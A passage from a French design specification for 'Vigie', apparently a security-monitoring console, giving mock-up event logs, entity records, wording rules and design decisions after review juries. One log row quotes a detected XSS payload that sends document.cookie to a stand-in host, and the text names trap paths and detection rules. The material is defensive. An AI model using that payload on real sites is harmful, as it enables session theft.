| `192.0.2.77` | la box de Julien (AS64502, France), suivie depuis le jeu. 1er oct. ; c'est elle qui a ouvert #398 la veille ; **protégée** (vue avec Julien à 14 h 09, jusqu'au lun. 16 nov.) |
| `192.0.2.140` | Camille (son ancien #401, retiré par le § 3.9, reste un événement Basse : `bordure_nouvel_operateur`, ven. 16 oct., 22 h 47) |
| `192.0.2.214` | l'appareil qui a rejoué le cookie de Julien à 11 h 26 (Firefox · Linux ; Julien : Safari · iOS), alerte #407 |
| `198.51.100.23` | #409 : AS64501, hébergeur de serveurs (Pays-Bas) ; vue depuis 13 h 29 ; 44 événements aujourd'hui, dont 37 rattachés à #409 (une salve de 13 h 41 à 13 h 47, puis 13 h 53 bordure, 13 h 54 piège `/.env`, 13 h 56 pages introuvables, 14 h 10 bordure, 14 h 12 min 20 piège `/.git/config`) ; aucun compte, aucune session |
| `203.0.113.61` | dans `203.0.113.0/24` (#405) ; piège `/wp-login.php` à 13 h 58 min 07 (dernière occurrence de #405) ; 4 requêtes de l'admin refusées en bordure à 14 h 06 (#86) |
| `2001:db8:7f3a:12::4` | une saisie malveillante isolée à 14 h 11 min 47, sans alerte (2 points, une source) |
| `2001:db8:5e:20::31` | une invitée qui a mal recopié son lien de photo offerte (14 h 18, Basse) |

**Journal du sam. 17 oct., de 0 h à 14 h 20 (MV-03)** : 318 événements hors routine (2 critiques, 1 haute, 96 moyennes, 141 basses, 78 info ; site 241, bordure 38, Zitadel 19, Vigie 20), 924 lignes de routine masquées (860 battements, 61 signaux notés, 3 états du site) ; 20 par page, 16 pages. Les 20 plus récents, à l'heure de leur source (écart de réception) :

| Heure à la source | Reçu | Événement | Gravité | Source | Adresse · compte |
|---|---|---|---|---|---|
| 14 h 18 min 05 | + 1 s | Jeton ou code faux, `/pour-vous/:token` | Basse | site | `2001:db8:5e:20::31` |
| 14 h 17 min 20 | + 36 s | Connexion chez Zitadel (console, second facteur) | Info | Zitadel | `2001:db8:4:1c::5e` · Sébastien |
| 14 h 15 min 02 | + 1 s | Session ouverte, `/auth/callback` | Info | site | `2001:db8:4:1c::5e` · Sébastien |
| 14 h 15 (minute) | + 1 min 38 | Page de l'admin servie depuis un opérateur jamais vu (AS64500) | Basse | bordure | `2001:db8:4:1c::5e` |
| 14 h 12 min 20 | + 1 s | Piège déclenché, `/.git/config`, résumé 5 fois en 5 min | Moyenne | site | `198.51.100.23` |
| 14 h 11 min 47 | + 1 s | Saisie malveillante, `/recherche`, famille xss dans `query.q`, 57 signes : `"><svg/onload=fetch('//exemple.test/c?'+document.cookie)>` | Moyenne | site | `2001:db8:7f3a:12::4` |
| 14 h 10 min 04 | — | Interrupteur changé : blocages automatiques arrêtés 1 h, par Julien (« essai de la bordure ») | Moyenne | contrôles de la Vigie | — |
| 14 h 10 (minute) | + 1 min 36 | Rafale de pages vue en bordure, 212 pages en 1 min | Moyenne | bordure | `198.51.100.23` |
| 14 h 09 min 31 | + 33 s | Connexion chez Zitadel (console, second facteur) | Info | Zitadel | `192.0.2.77` · Julien |
| 14 h 06 (minute) | + 1 min 52 | Requêtes bloquées en bordure, 4 requêtes de l'admin | Info | bordure | `203.0.113.61` |
| 14 h 05 min 00 | — | Alerte ouverte : #413 | Info | contrôles de la Vigie | — |
| 14 h 05 min 00 | — | Contrôle des rôles : sauvegarde de 14 h 04, administrateur sans changement journalisé (`zitadel-329906113`) | Critique | contrôles de la Vigie | — |
| 14 h 02 min 12 | — | Décision prise : #87, sessions de `zitadel-329906113` fermées, 48 h | Moyenne | contrôles de la Vigie | — |
| 14 h 02 min 12 | — | Décision prise : #88, `zitadel-329906113` gelé 24 h | Moyenne | contrôles de la Vigie | — |
| 14 h 02 min 12 | — | Alerte ouverte : #412 | Info | contrôles de la Vigie | — |
| 14 h 02 min 11 | + 1 s | Droits d'un compte changés, hors de l'application (rôle Administrateur donné à `zitadel-329906113`) | Critique | site | — |
| 13 h 58 min 52 | + 1 s | Connexion réussie, `/auth/callback` | Info | site | `192.0.2.140` · Camille |
| 13 h 58 min 20 | + 40 s | Échec d'authentification chez Zitadel (mot de passe erroné) | Moyenne | Zitadel | `192.0.2.140` · Camille |
| 13 h 58 min 07 | + 1 s | Piège déclenché, `/wp-login.php` | Moyenne | site | `203.0.113.61` |
| 13 h 56 min 30 | + 1 s | Pages introuvables en rafale, 20 en 10 min | Basse | site | `198.51.100.23` |

**Fiches d'entité à 14 h 20 (MV-04)**

- `198.51.100.23` : score 13,9 (site 8,3 · bordure 5,6), soit 15,2 à 14 h 12 diminué de 8 minutes de demi-vie ; sous le seuil de 7 vers 15 h 20 sans nouveau signal ; absente des listes de menaces ; réseau `198.51.100.0/24` à 3,4 (seuil 12 : il ne reçoit que les points de base, les règles notent l'adresse) ; aucune décision en cours ; rien ne la protège, mais la règle du score est en Observer et les blocages automatiques arrêtés jusqu'à 15 h 10.
- `zitadel-318204977` (Julien) : sessions `7be21d90c4a8` (Safari · iOS, `192.0.2.77`, ouverte à 08 h 41, fermée par Julien à 10 h 58, son cookie rejoué à 11 h 26 min 39 depuis `192.0.2.214`, route `/admin`) et `a3f09c1d27e4` (Chrome · macOS, ouverte ven. 16 oct., 20 h 12, refusée depuis 11 h 26 par #84) ; #407 prise en charge par Sébastien à 11 h 41 ; décision #84 à 11 h 26 min 40 ; score 0,4 (site) ; aucune session sur le site depuis ; Geler impossible (`ADMIN_SUBS`) ; nom repris du contrôle des rôles de 14 h 05.
- `192.0.2.77` : score 0,0 (dernier point ven. 16 oct., 19 h 31) ; vue avec Julien ; #398 close.

**Écarts relevés en dessinant (à trancher)**

1. **Numéros #87 et #88** : pour `geler_et_revoquer`, le code crée le gel puis la fermeture des sessions (`vigie/moteur.js`, `respond`) ; le gel aurait donc le plus petit numéro, l'inverse du § 3.4. MV-03 garde les numéros du § 3.4 et montre les deux décisions dans l'ordre de leurs numéros.
2. **L'adresse du rejeu est protégée** : `linkedSubs` compte tout lien adresse–compte des 30 derniers jours ; l'événement du cookie rejoué (compte de Julien, adresse `192.0.2.214`) crée ce lien, et l'adresse de l'attaquant devient « vue avec un administrateur » : jamais bloquée automatiquement. Proposition : ne compter que les liens nés d'une connexion réussie (`authn_login_success`, `session_created`, `zitadel_connexion`). MV-04 le signale (▲) sur la fiche du compte.
3. **« Les 37 événements » de MV-02** mène à `/evenements?adresse=198.51.100.23`, qui en montre 44 (la journée de l'adresse) ; les 37 sont ceux de l'alerte : filtre `?alerte=409` (par `alert_events`), à créer.
4. **Clé d'un réseau** : `truncateIp` (`server/ip.js`) écrit `198.51.100.0` et `2001:db8:4::`, sans suffixe ; la console ajoute /24 ou /48 à l'affichage ; la fiche est `/entites/reseau/198.51.100.0`.
5. **Événements sans compte** : `vigie_decision`, `vigie_controle_roles` et le changement hors application (`by_sub` absent) n'ont ni `sub` ni `ip` ; le compte visé est dans le détail : colonne « — », et un filtre par compte ne les trouve pas. À créer : renseigner `sub` quand la cible est un compte.
6. **Actions faites dans la console** : le code ne connaît que le composant `vigie · ligne de commande` (sans source du quorum, `sourceOf` → null) ; MV-03 écrit l'émetteur « console · Julien » sous la puce « contrôles de la Vigie », comme MV-02 pour une décision. À créer : `vigie · console`.
7. **Écart de réception dit tardif** : un seuil par source (site 1 min, Zitadel 2 min, bordure 3 min) plutôt qu'une minute pour tous (MV-02) : la bordure, lue chaque minute, serait toujours « en retard ».

### 3.11 Compléments de MV-05, MV-06, MV-08 (ajoutés le 18 oct. 2026)

Ce qui manquait pour dessiner les décisions, les réglages et les droits ; à reprendre tel quel dans les autres maquettes.

**Mots**

| On écrit | Ce que cela désigne | On n'écrit pas |
|---|---|---|
| **Bloquer 1 h** · **Bloquer 24 h** · **Bloquer 7 jours** · **Bloquer 30 jours** | Les boutons de « Bloquer une adresse » (30 jours : le maximum du code). De même **Geler 1 h**… **Geler 30 jours**, **Verrouiller 1 h** · **12 h** · **24 h**. | « Valider », une liste de durées et un bouton « Envoyer » |
| **Type de décision** | Les quatre liens au-dessus du formulaire (« Bloquer une adresse », « Fermer les sessions d'un compte », « Geler un compte », « Fermer une session ») ; « Verrouiller l'admin » a son propre panneau. | « action », « commande » |
| **ajouté d'office** · **ajoutée d'office** | Le compte et l'adresse de qui verrouille l'admin, déjà dans la liste des autorisés, ✓ à la place de la case. | « obligatoire », « verrouillé » |
| **Bloquer quand même 24 h** | L'action de la confirmation « Bloquer un réseau qui contient votre adresse ? », en danger plein ; l'issue proposée d'abord : **Annuler et bloquer le seul scanner**. | « Confirmer » |
| **Lever le gel** | L'action de la page « Lever le gel de ce compte ? » (après « Lever le gel… »). | « Supprimer » |
| **Arrêter 1 h** · **Arrêter 4 h** · **Arrêter jusqu'à demain 8 h** · **Autre durée, 7 jours au plus** | Les durées d'un interrupteur ; « jusqu'à demain 8 h » est calculé par la console (heure de Paris). | « Désactiver », « Couper » |
| **Enregistrer** (mode d'une règle) | N'apparaît que si le mode choisi diffère du mode enregistré. | « Appliquer » |
| **Envoyer un essai** | L'essai d'un canal ; le texte exact qui partira est montré au-dessus. | « Tester » |
| **Seuils du score** · **Adresses de confiance** · **Canaux de notification** | Les blocs de `/reglages`. | « Paramètres » |
| **plafond** · **attribution** · **droit effectif** | Les deux clés et leur résultat (annexe § 5.4) ; « pas encore attribuée » quand l'attribution manque. | « permission », « niveau » |
| **Intervenante** · **Administratrice** | Les rôles dits d'une femme (Camille), avec « Lectrice » (§ 1) ; « Analyste » ne change pas. | « Intervenant » pour Camille |

**Données**

- **Adresse de Sébastien** : celle du § 3.10, `2001:db8:4:1c::5e` (son téléphone, AS64500) ; sa **dernière confirmation d'identité est sa connexion à la console de 14 h 17** (§ 3.10) : à 14 h 20 il n'a rien à confirmer, la ré-authentification revient après 14 h 22 (les états de MV-05 qui la montrent sont donc postérieurs). Le constat Basse de 14 h 15, « Page de l'admin servie depuis un opérateur jamais vu », c'était lui : c'est la confirmation « votre propre adresse » de MV-05 (il veut bloquer `2001:db8:4:1c::/64`, motif « opérateur jamais vu en bordure (14 h 15) », L'admin et la connexion, 24 h).
- **Plafond des blocages** : 256 adresses IPv4 bloquées (#86) sur 16 777 216 (l'équivalent d'un /8, `MAX_IPV4`).
- **Saisie refusée (MV-05)** : `198.51.100.0/2` (pour `/24`), portée « L'admin et la connexion », motif « scanner de l'alerte #409 », après « Bloquer 24 h » ; le code répond « réseau trop large ou invalide : /2 (IPv4 de /8 à /32) ».
- **Verrouiller l'admin** : comptes proposés : Sébastien (ajouté d'office), Julien (toujours admis par le site : `ADMIN_SUBS`) ; `zitadel-329906113` jamais proposé (administrateur non déclaré, #412, #413) ; adresse ajoutée d'office avec son /64 : `2001:db8:4:1c::/64` (un téléphone change d'adresse dans son /64, comme le dit `vigie/moteur.js` pour les blocages automatiques).
- **Adresse de confiance** : une seule, `192.0.2.140`, box de Camille (§ 3.10), ajoutée par Sébastien le ven. 16 oct., 18 h 40 : relectrice, elle n'est pas à l'abri d'office comme un administrateur (`linkedSubs`). Pas la box de Julien, `192.0.2.77`, déjà protégée d'office (MV-04 le montre ainsi). Le nom, l'auteur et la date sont **à créer** (le code ne garde que l'adresse).
- **Canaux** : Signal, groupe « Vigie Nicephos », dernier message 14 h 02 (#412) ; e-mail en secours, Sébastien et Julien (`VIGIE_MAIL_TO`, § 3.12), jamais utilisé. Messages d'essai mot pour mot : « Vigie : essai du canal signal (14 h 20). » ; l'e-mail porte la même phrase en objet et en corps, puis « Vigie Nicephos — ce message ne contient aucune donnée personnelle ; le détail est dans la console. ». État d'essai (hypothèse, MV-06) à 14 h 21 : e-mail parti ; Signal refusé, « passerelle Signal : réponse 400 (limite de Signal : captcha à résoudre) ».
- **Règles** : 53 au registre du moteur (le score, 42 règles Sigma et corrélations, 10 détecteurs) : 25 ouvrent une alerte d'elles-mêmes, 1 est le score, 27 déposent des points ; 2 en Bloquer (`sigma.role_hors_application`, `sigma.cookie_rejoue`), 51 en Observer. Une règle à points n'ouvre jamais d'alerte : son mode se réduit à Observer ou Arrêt. Les 12 règles de contexte (`generate: false`) ne sont pas au registre.
- **Titres lisibles des détecteurs (proposés, à créer ; le code écrit le nom brut)** : `premiere_apparition` « Connexion d'un compte depuis un pays ou un appareil jamais vus » ; `heure_inhabituelle` « Activité d'un compte à une heure jamais utilisée » ; `vitesse` « Lectures d'un compte bien au-delà de son habitude » ; `voyage_impossible` « Voyage impossible entre deux connexions d'un compte » ; `pivot_identifiants` « Connexion réussie après des échecs répétés » ; `role_incoherent` « Export réservé à l'administrateur fait par un autre compte » ; `exploration_lente` « Exploration lente depuis un réseau (pièges et erreurs sur 12 heures) » ; `chaine_attaque` « Chaîne d'attaque : repérage, tentative puis accès sur une même entité » ; `silence` « Site silencieux : aucun battement depuis 3 minutes » ; `menaces` « Adresse sur une liste de menaces (Spamhaus DROP, Feodo, Tor) ».
- **Droits** : Sébastien et Julien Administrateurs « à l'installation » (amorce `VIGIE_ADMIN_SUBS`, sans date) ; journal de Camille (§ 3.12) : connexion refusée le ven. 16 oct. à 18 h 12 (DS30), `vigie.viewer` donné par Sébastien dans Zitadel à 18 h 25, première entrée en Lectrice à 18 h 30, notée et signalée aux Administrateurs (DS29 : proposition, l'annexe ne le dit pas) ; connexions refusées à la console sur 7 jours : 1. Un **Intervenant** n'existe pas aujourd'hui : la vue Intervenant de MV-06 est une hypothèse.

**Écarts relevés en dessinant (à trancher ou à créer)**

1. Le code borne une durée trop longue sans le dire (`Math.min` avec `MAX_DURATION`) : la console n'offre que des durées permises ; « Geler : jusqu'à levée » (annexe § 6.3) cède au code (30 jours au plus).
2. Le motif d'un arrêt d'interrupteur (« essai de la bordure », § 3.5) n'est pas gardé par le code (`interrupteurs.js` : auteur et fin seulement) : **à créer**.
3. L'ajout d'office du compte et de l'adresse de qui verrouille, et la confirmation sur sa propre adresse, sont de la console (le code exige seulement « au moins un compte ou une adresse ») : **à créer**. Le site exempte ses `ADMIN_SUBS` d'un gel et d'un verrouillage, pas d'un blocage d'adresse.
4. Le seuil « appareil » (7) du code n'a aucune règle qui l'alimente : non montré.
5. Les destinataires des canaux se règlent dans le `.env` de la Vigie, pas dans la console (l'annexe § 5.4 les donne à l'Administrateur).
6. L'alerte « surveillance réduite » d'un interrupteur arrêté plus de 24 h (annexe § 6.1) n'est pas dans le code.
7. Liens de MV-01 : « Arrêter… » (`/reglages/interrupteurs/<nom>`) mène à la carte de l'interrupteur sur `/reglages` (`#inter-<nom>`) ; « Nouvelle décision… » (`/decisions/nouvelle`) à la page Décisions, formulaire du type choisi (`?type=…#nouvelle`).
8. Un essai de canal qui échoue n'ouvre pas d'alerte (`test` n'appelle pas `failed`) ; seul l'échec d'une vraie notification en ouvre une.

### 3.12 Compléments de MV-07, MV-09, MV-10 (ajoutés le 18 oct. 2026)

Mots :

| On écrit | Ce que cela désigne | On n'écrit pas |
|---|---|---|
| **Répond** · **Écart** · **Intacte** · **Rompue** · **Injoignable** · **Muette** · **À jour** · **Prêts** · **Place suffisante** | L'état d'un composant sur la page Santé, avec le symbole des états (● ▲ ✕) (MV-07). | « OK », « KO », « down » |
| **Alerte si…** | Ce qui fait parler la Vigie pour un composant, avec le titre de la règle du code (MV-07). | « seuil » seul |
| **Vérifier maintenant** · **Recopier la liste maintenant** · **Accepter comme référence…** | Vérifier la chaîne ; recopier les blocages en bordure ; faire de l'instantané du contrôle des rôles la référence (MV-07). | « Relancer », « Synchroniser » |
| **Connexion refusée** · **Second facteur exigé** · **Confirmation refusée** · **Session expirée** · **Accès refusé** · **Connexion impossible pour l'instant** | Titres des pages hors session de la console (MV-09). | « Erreur 403 » en titre, « Non autorisé » |
| **Se reconnecter** · **Utiliser un autre compte** · **Ouvrir mon compte Zitadel** | Boutons des pages hors session (MV-09). | « Login » |
| **Sécurité** (DE **Sicherheit**, EN **Security**) | L'entrée de la barre latérale de l'admin du site, comptes `securite.voir` (MV-10). | « Vigie » dans le menu de l'admin |
| **Ouvrir la Vigie** (DE **Vigie öffnen**, EN **Open Vigie**) | Le lien qui ouvre la console dans un nouvel onglet, depuis l'admin (MV-10). | « Ouvrir la console » |
| **alerte** (DE **Warnung**, EN **alert**) | Dans les libellés allemand et anglais de l'admin ; à faire relire (MV-10). | DE « Meldung » (pris par « Signalements ») |

Données :

- **Santé, sam. 17 oct., 14 h 20 (MV-07)** : chaîne vérifiée à 03 h 10, 1 182 406 lignes en 16 s (13,5 s par million, vigie-capacite.md) ; tête publiée : ligne 1 182 406, maillon `9f3c51e0…e1a7` ; purge de 03 h 10 : 6 431 lignes ; battement du site 14 h 19, 0 en attente, 0 lot refusé ; Zitadel lu à 14 h 19 ; Worker : battement 14 h 15, état « liste 31, 1 blocage(s) » (texte de bordure/worker.js), lu jusqu'à 14 h 17, constats sur 24 h : 6 rafales de pages (#409) et 14 blocages appliqués ; contrôle des rôles : instantané `site-2026-10-17T120400.db` (14 h 04 de Paris, nom en UTC), contrôlé à 14 h 05, 3 administrateurs dont 1 sans changement journalisé (`zitadel-329906113`), 7 déclencheurs sur 7 inchangés, contrôle précédent 13 h 05 conforme ; Signal : 2 messages ce jour (#407 à 11 h 26, #412 à 14 h 02).
- **« Vérifier maintenant » (MV-07, état)** : par Sébastien à 14 h 21, 1 185 377 lignes en 16 s, intacte.
- **Chaîne rompue (MV-07, hypothèse du § 3.7)** : la ligne 1 181 950 dit aujourd'hui « événement du site reçu le sam. 17 oct. à 01 h 27, connexion à l'admin réussie » ; une seule rupture.
- **Zitadel injoignable (MV-07, hypothèse)** : dernière lecture réussie 12 h 47, 93 échecs, dernier « Zitadel : réponse 503 » ; reprise depuis 12 h 42 ; alerte « Événements de Zitadel perdus » le dim. 18 oct. à 08 h 47 si rien ne change.
- **Bordure muette (MV-07, hypothèse)** : dernier battement 13 h 50 ; alerte « Bordure injoignable ou silencieuse » (Moyenne) ouverte à 14 h 14.
- **Camille (MV-09)** : le ven. 16 oct., à 18 h 12, connexion refusée (aucun rôle `vigie.*`) ; Sébastien lui donne `vigie.viewer` dans Zitadel à 18 h 25 ; première connexion en Lectrice à 18 h 30 (§ 3.6). Cela réconcilie le § 3.1 (« aucun rôle ») et le § 3.6. Sur le site, elle est Relectrice, sans `securite.voir` (MV-10). Le lexique de l'administration la dit désactivée depuis le 2 oct. : à trancher.
- **Session expirée (MV-09, hypothèse)** : Sébastien, 14 h 52, après 15 minutes sans activité. Référence de demande du 403 : `7c2e91a4`. Compte Zitadel : `https://nicephos-xxxxxx.zitadel.cloud` (adresse type de deploy/unraid/README.md).
- **Admin du site (MV-10)** : Julien, Administrateur, le sam. 17 oct. à 14 h 20 ; « Aujourd'hui » reprend les cinq lignes de MQ-07 (état 20) et y ajoute la ligne de la Vigie. Le résumé (`GET /v1/resume`) ne compte pas les alertes en mode Observer : **1 critique (#412) et 1 haute (#407)**, plus grave « Rôle donné, retiré ou compte changé hors de l'application » depuis 14 h 02, `critique_a_prendre` vrai. Le § 4 écrivait « 1 alerte critique à traiter » : la ligne dit « 1 alerte critique et 1 haute ouvertes dans la Vigie ».
- **Résumé indisponible (MV-10, hypothèse du § 4)** : dernier résumé reçu à 14 h 10.
- **E-mail (MV-10)** : `VIGIE_MAIL_FROM` = « Vigie Nicephos <vigie@example.org> », `VIGIE_MAIL_TO` = sebastien.exemple@example.org, julien.exemple@example.org (adresses du lexique de l'administration).

Écarts relevés (à trancher) :

1. **MV-01, état 12** écrit « ce qui précède reste garanti ; ce qui suit ne l'est plus » : vigie/store.js continue après une rupture ; une ligne modifiée ne rompt qu'elle-même. MV-07 écrit « les autres lignes, avant et après, sont intactes ».
2. **Règles critiques en mode Observer** : `chaine_rompue` et `controle_roles` n'ont pas de mode dans le code (Observer par défaut) ; le résumé de l'admin et les notifications les laissent de côté : ni bandeau, ni ligne, ni message Signal pour #413 ou une chaîne rompue.
3. **Rupture expliquée** : elle ressort à chaque vérification, sans moyen d'en prendre acte (comme `controle --accepter`).
4. **Résumé indisponible** : le bandeau disparaît avec le résumé ; on pourrait garder le dernier, daté.
5. **Annexe § 4.3** : `GET /v1/summary` et « e-mail tout de suite » ; le code sert `/v1/resume` et envoie Signal d'abord, l'e-mail en secours.

### 3.13 Arbitrages du 18 oct. 2026 après MV-03 à MV-10 : à reprendre dans toutes les maquettes

1. **Modes de départ corrigés dans le code** (PR #116) : les preuves DS8 sans réponse possible (`administrateur_donne`, `integrite_comptes`, `controle_roles`, `controle_roles_degrade`) et la chaîne rompue (`chaine_rompue`, DS20) sont en **Alerter**. **#413 est donc en mode Alerter** : elle compte dans le résumé de l'admin (MV-10 : « 2 critiques et 1 haute ouvertes ») et elle a été envoyée sur Signal à 14 h 05. Une chaîne rompue aussi.
2. **Exemption de blocage automatique** (PR #116) : seule une **connexion réussie** d'un administrateur protège une adresse. L'adresse `192.0.2.214` du cookie rejoué (#407) n'est pas protégée ; MV-04 le dit comme le code le fait désormais (« ▲ faille » retiré, remplacé par la règle).
3. **Numéros des décisions de #412** : le code crée le gel puis la fermeture des sessions ; **#87 Geler un compte**, **#88 Fermer les sessions d'un compte** (§ 3.4 inversé).
4. **Ré-authentification** avant tout changement de mode d'une règle, de seuil ou d'interrupteur, comme avant une action forcée.
5. **DS29** : l'arrivée d'une personne sans attribution est notée au journal des droits et signalée aux Administrateurs (Moyenne) ; un changement de droits est Haute.
6. **Résumé indisponible** (MV-10) : le bandeau d'une critique reste affiché, **daté** (« au dernier résumé, 14 h 10 »), avec « Résumé de la Vigie indisponible depuis 14 h 11 » : à créer dans le site.
7. **Chaîne rompue** (MV-01, MV-07) : une ligne modifiée ne rompt qu'elle-même, la vérification continue et liste toutes les ruptures (`vigie/store.js`) ; le texte ne dit jamais « ce qui suit n'est plus garanti ». « Prendre acte d'une rupture expliquée » : **à créer** (équivalent de `controle --accepter`).
8. **À créer pour la console** (D3), sans le dessiner autrement : filtre des événements par alerte (`?alerte=409`), source `vigie · console` pour les actions faites depuis la console, suffixe `/24` ou `/48` affiché pour un réseau, seuil de retard de réception propre à chaque source (la bordure lit à la minute), titres lisibles des détecteurs, motif d'un arrêt d'interrupteur gardé par le code.
9. **Adresses des pages** : `/reglages#interrupteurs`, `/reglages#regles`, `/decisions#nouvelle` (ancres des pages MV-06 et MV-05) ; MV-01 et MV-02 les reprennent.
10. **Textes allemands de MV-10** (« Sicherheit », « Warnung ») : validés le 18 oct. 2026 ; on garde « Sicherheit » pour le menu, « Sicherheitswarnung » pour une alerte.

### 3.14 Arbitrages après le jury v1 (18 oct. 2026) : passe 2, à reprendre dans toutes les maquettes

Deux jurés indépendants (ergonomie et direction artistique ; accessibilité, sobriété, faisabilité et sécurité). Notes de 7 à 9 ; sous le seuil de 8 : MV-01, MV-02, MV-05 (jury 1) et MV-06, MV-07 (jury 2). Décisions :

1. **Affaiblir la surveillance est un geste lourd.** Arrêter un interrupteur, passer une règle en Arrêt, ajouter une adresse de confiance, accepter une référence du contrôle des rôles ou prendre acte d'une rupture de chaîne :
   - demandent une ré-authentification et une durée (7 jours au plus ; une règle en Arrêt se remet seule dans son mode, comme un interrupteur) ;
   - demandent un motif obligatoire et une page de confirmation qui dit ce qui ne sera plus vu ;
   - préviennent les autres Administrateurs : l'alerte « Surveillance réduite » (Moyenne, mode Alerter) part sur Signal.

   **Arrêter la Détection** a sa page de confirmation. **« Accepter comme référence… »** est refusé tant qu'une alerte du contrôle des rôles est ouverte (#413) ; sa page nomme les comptes et les déclencheurs acceptés. Code : à faire dans la Vigie (durée des modes, alerte « Surveillance réduite », refus de l'acceptation), voir la PR qui suit le jury.
2. **Retour après chaque action** (`role="status"`, en tête de la page qui revient) : « Décision #89 créée, lue par le site à 14 h 23 », « Alerte prise en charge », « Gel levé », « Attribution changée ». À dessiner dans MV-01, MV-02, MV-05, MV-06 et MV-08.
3. **Aucune portée cochée par défaut** pour un blocage (MV-02, MV-04, MV-05). Le bouton reste inactif tant qu'aucune portée n'est choisie ; sans script, une erreur près du champ.
4. **Bloquer une adresse liée à un administrateur** (connexion réussie dans les 30 jours) **demande la même confirmation** partout (MV-02, MV-04, MV-05) que bloquer sa propre adresse. Le garde-fou figure dans la liste de MV-05.
5. **Fiche d'une alerte critique (MV-02) : bloc « À faire maintenant »** en tête :
   - pour #412 : 1. retirer le rôle dans **Comptes et rôles** de l'admin (le site garde le compte gelé jusqu'au dim. 18 oct., 14 h 02) ; 2. chercher comment la base a été modifiée (accès au serveur, outil SQL, restauration) ; 3. prolonger le gel si besoin (« Geler 7 jours »).
   - un titre factuel (« Un compte inconnu est devenu Administrateur hors de l'application »), la règle en sous-titre ;
   - un en-tête compact au téléphone ;
   - « Lever la fermeture des sessions… » et « Lever le gel… », toujours nommés par leur objet.
6. **Ordre des alertes, partout (console, admin, résumé)** : gravité, puis **Ouverte avant Prise en charge**, puis **la plus récente d'abord**. #413 (14 h 05) vient avant #412 (14 h 02). Le résumé de l'admin et sa ligne pointent vers la même alerte que la console, par un lien profond `/alertes/413`. Code : tri de `alertes` et du résumé à aligner (PR qui suit).
7. **Admin du site (MV-10) : pas de titre de règle**. Un attaquant devenu administrateur du site ne doit pas apprendre ce qui l'a vu. Le bandeau et la ligne disent seulement la gravité et le nombre : « 2 alertes critiques dans la Vigie · ouvert à 14 h 05 », avec le lien `/alertes/413`. Le badge est un nombre avec le signe d'alerte (▲ 3), jamais ✕. Code : titre retiré du résumé signé, numéro de l'alerte en tête ajouté (PR qui suit). Les messages Signal et e-mail gardent le titre (canaux de la Vigie).
8. **Message Signal : la réponse déjà faite**, par exemple « Réponse : compte gelé 24 h, sessions fermées », ou « Aucune réponse automatique ». Code : `messageOf` (PR qui suit). Toujours la phrase « Ouvrez la Vigie depuis votre favori ; elle ne demande jamais votre mot de passe par message. » dans l'e-mail.
9. **Imitation de l'interface** : second facteur **par clé d'accès (passkey, WebAuthn)**, résistant à l'hameçonnage, exigé pour l'application « Vigie » dans Zitadel (MV-09 le dit). Le lien d'un message n'est qu'une commodité ; le favori fait foi.
10. **Amorce `VIGIE_ADMIN_SUBS`** : elle l'emporte. Un compte de l'amorce reste Administrateur de la console ; pour le rétrograder, il faut le retirer de l'amorce (`vigie.env`). MV-08 montre « Rendre Julien Analyste » **refusé**, avec cette raison. Tout retrait de droit est en style danger.
11. **Lectrice** :
    - une adresse complète n'est jamais acceptée dans une adresse de page ni dans un filtre (redirection vers `/entites/reseau/…`, filtres en /24 ou /48) ;
    - MV-04 dessine l'état Lectrice.
    - Toutes les pages sont servies avec `Referrer-Policy: no-referrer` et `Cache-Control: no-store`. « Ni dans l'historique » est corrigé : les adresses de page contiennent des adresses IP pour un Intervenant, et c'est dit.
12. **Rafraîchissement par script** : une route de lecture qui ne prolonge pas la session (`ETag`, 304). La session expire toujours après 15 min sans geste.
13. **Export CSV** : cellules neutralisées (`= + - @`, tabulation et retour chariot préfixés d'une apostrophe), dit dans MV-03.
14. **Erreurs à dessiner** :
    - filtre invalide (MV-03) ;
    - seuil ou adresse de confiance invalides (MV-06) ;
    - « Autre durée » garde le motif saisi.

    MV-09 : le retour après connexion n'accepte qu'un chemin local.
15. **Accessibilité** :
    - `@media (forced-colors: active)` : bordure `ButtonText` des boutons, sélection en `Highlight` ;
    - `overflow-wrap: anywhere` pour `.sub`, `.ip` et `dd` dans les cellules étroites, sans couper un identifiant à l'écran normal (insécable tant qu'il tient) ;
    - liens de même nom distingués par le numéro ;
    - aucune transition en mouvement réduit.
16. **Homogénéité et direction artistique** :
    - un seul composant d'état (pastille et mot) ;
    - compteur « Décisions » neutre ;
    - légende des gravités limitée aux trois gravités d'alerte (Critique, Haute, Moyenne) ;
    - trois chiffres de 7 jours sur une ligne ;
    - ré-authentification en une ligne d'en-tête (« Identité confirmée à 14 h 17, valable jusqu'à 14 h 22 ») ;
    - moins de texte explicatif dans l'écran (l'explication passe dans l'aide ou l'encart), plus de silence entre les blocs ;
    - pas de codes d'analyste à l'écran (« MV11 », « D22 », « preuve à source unique ») : cas en clair, codes en petit pour qui les cherche.
17. **Téléphone** :
    - filtres de MV-03 repliés en un résumé (« Aujourd'hui · sans la routine · Modifier ») ;
    - règles à points de MV-06 repliées ;
    - en-tête de MV-02 compact.
18. **Encarts** : la console dépend des classes de l'admin refondue (`liste-a`, `champ-a`, `note-a`, `kv-a`, `plier`), qui n'existent pas encore dans `public/admin/admin.css`. La console embarquera ces styles (à créer, D3). Blocs « Mesures » remplis par `mesures-vigie.py`.

### 3.15 Arbitrages après le jury v2 (18 oct. 2026) : passe 3

Notes du jury v2 : de 7 à 9 (jury 1 : MV-06 et MV-07 à 7 ; jury 2 : aucune sous 8). Le code suit (PR #121, à montrer comme fait) :

1. **Surveillance réduite, un message à chaque geste** :
   - hors du plafond des alertes, même quand #414 est ouverte ;
   - le texte exact est « [Moyenne] Surveillance réduite : blocages automatiques arrêtés jusqu'à 15 h 10 », puis « Source : contrôles de la Vigie », puis « 14 h 10 · https://vigie.nicephos.art/reglages » (sans ligne « Réponse », sans motif, sans adresse) ;
   - gestes couverts aussi : descente de mode (Bloquer → Alerter → Observer) et seuil relevé ;
   - en fin d'arrêt, une règle **reprend le mode qu'elle avait avant**.

   MV-10 état 11 (« Ce qui ne part jamais ») est corrigé en conséquence. #414 ne reste pas « muette tant qu'elle est ouverte » : chaque nouveau geste envoie un message (MV-01).
2. **Message de #412, texte exact du code** : « Réponse : compte gelé 24 h, sessions du compte fermées » (heures jusqu'à 48 h). À reprendre mot pour mot partout (MV-02, MV-10).
3. **Motif obligatoire** pour tout geste qui réduit la surveillance, comme en ligne de commande (l'écran et le code s'accordent).
4. **« Accepter comme référence » n'a pas de durée** : elle remplace la référence (comportement du code). Il faut une page de confirmation qui nomme comptes et déclencheurs, et un refus tant que #413 est ouverte. On retire « pour 1 jour / 7 jours ».
